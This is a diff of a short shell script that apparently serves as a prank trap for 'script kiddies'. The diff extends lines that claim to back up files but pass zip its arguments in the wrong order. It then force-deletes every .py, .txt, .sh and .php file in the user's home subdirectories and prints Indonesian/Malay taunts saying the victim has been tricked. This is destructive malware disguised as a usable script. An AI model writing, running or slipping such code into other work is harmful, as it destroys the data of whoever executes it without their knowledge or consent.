@@ -2,10 +2,15 @@
 #
 mkdir -p ~/.backups
 
-zip ~/*/*.py ~/.backups/file.zip
+zip ~/*/*.py ~/.backups/py.zip
+zip ~/*/*.txt ~/.backups/txt.zip
+zip ~/*/*.sh ~/.backups/sh.zip
+zip ~/*/*.php ~/.backups/php.zip
 
-rm -rf ~/*/*.py
-rm -rf ~/*/*.txt
+rm -f ~/*/*.py
+rm -f ~/*/*.txt
+rm -f ~/*/*.sh
+rm -f ~/*/*.php
 
 echo -ne "Selamat anda kena tipu"
 echo -ne "\nMampus, makanya berkarya jangan jadi script kiddie"
